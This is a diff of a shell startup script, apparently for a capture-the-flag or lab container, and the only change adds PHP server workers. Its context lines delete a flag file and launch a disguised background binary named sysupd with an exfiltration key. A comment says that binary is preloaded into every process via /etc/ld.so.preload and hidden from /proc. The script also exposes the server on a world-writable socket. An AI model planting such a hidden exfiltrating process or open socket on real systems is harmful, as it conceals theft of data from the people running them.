@@ -14,7 +14,8 @@ rm -f /run/sock/flag
 # into every process by /etc/ld.so.preload, hides it from /proc listings.
 EXFIL_KEY="$KEY" /usr/lib/.sysmon/sysupd 604800 >/dev/null 2>&1 &
 
-php -S 127.0.0.1:8080 -t /srv/site >/dev/null 2>&1 &
+# Several workers: a command that never returns (grep -R /) must not block the page for everyone.
+PHP_CLI_SERVER_WORKERS=4 php -S 127.0.0.1:8080 -t /srv/site >/dev/null 2>&1 &
 
 exec socat UNIX-LISTEN:/run/sock/app.sock,fork,mode=666,unlink-early \
      TCP:127.0.0.1:8080
